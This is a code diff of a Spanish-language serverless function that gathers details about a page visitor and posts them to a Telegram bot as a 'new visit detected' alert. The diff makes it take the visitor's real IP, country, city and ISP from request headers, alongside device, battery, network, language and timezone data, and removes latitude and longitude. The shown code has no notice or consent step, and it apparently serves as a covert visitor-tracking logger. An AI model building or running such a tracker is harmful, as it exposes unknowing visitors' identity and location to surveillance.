@@ -3,31 +3,30 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 exports.handler = async (event) => {
   if (event.httpMethod !== "POST") {
-    return {
-      statusCode: 405,
-      body: JSON.stringify({ error: "Método no permitido" })
-    };
+    return { statusCode: 405, body: JSON.stringify({ error: "Método no permitido" }) };
   }
 
   let data;
   try {
     data = JSON.parse(event.body);
   } catch (err) {
-    return {
-      statusCode: 400,
-      body: JSON.stringify({ error: "JSON inválido" })
-    };
+    return { statusCode: 400, body: JSON.stringify({ error: "JSON inválido" }) };
   }
 
-  // ✅ TU MENSAJE (lo que ya tenías)
+  // 🌐 OBTENER IP REAL DESDE EL SERVIDOR
+  const ip = event.headers["x-nf-client-connection-ip"] || 
+             event.headers["x-forwarded-for"]?.split(",")[0] || 
+             "Desconocida";
+
+  // 📨 MENSAJE CORREGIDO (coinciden los nombres de campos)
   const mensaje = `
 🚨 *NUEVA VISITA DETECTADA*
 
 🌐 RED
-IP: ${data.ip || "Desconocida"}
-País: ${data.country || "Desconocido"}
-Ciudad: ${data.city || "Desconocida"}
-ISP: ${data.isp || "Desconocido"}
+IP: ${ip}
+País: ${event.headers["x-country"] || "Desconocido"}
+Ciudad: ${event.headers["x-city"] || "Desconocida"}
+ISP: ${event.headers["x-isp"] || "Desconocido"}
 Tipo: ${data.tipoRed || "Desconocido"}
 Velocidad: ${data.velocidad || "Desconocida"}
 Latencia: ${data.latencia || "Desconocida"}
@@ -57,8 +56,6 @@ Estado: ${data.bateriaEstado || "Desconocido"}
 Idioma: ${data.idioma || "Desconocido"}
 Zona Horaria: ${data.zonaHoraria || "Desconocida"}
 Fecha/Hora: ${data.fechaLocal || "Desconocida"}
-Latitud: ${data.lat || "No solicitada"}
-Longitud: ${data.lon || "No solicitada"}
 
 🔒 SEGURIDAD
 HTTPS: ${data.https || "Desconocido"}
@@ -72,13 +69,9 @@ Notificaciones: ${data.notificaciones || "Desconocido"}
 `.trim();
 
   try {
-    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
-      throw new Error("Faltan variables de entorno");
-    }
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) throw new Error("Faltan variables");
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-    const res = await fetch(url, {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -89,19 +82,10 @@ Notificaciones: ${data.notificaciones || "Desconocido"}
     });
 
     if (!res.ok) throw new Error("Error al enviar a Telegram");
+    return { statusCode: 200, body: JSON.stringify({ success: true }) };
 
-    return {
-      statusCode: 200,
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ success: true, message: "✅ Enviado a Telegram" })
-    };
-
-  } catch (error) {
-    console.error("Error:", error);
-    return {
-      statusCode: 500,
-      body: JSON.stringify({ success: false, error: error.message })
-    };
+  } catch (err) {
+    return { statusCode: 500, body: JSON.stringify({ error: err.message }) };
   }
 };
 
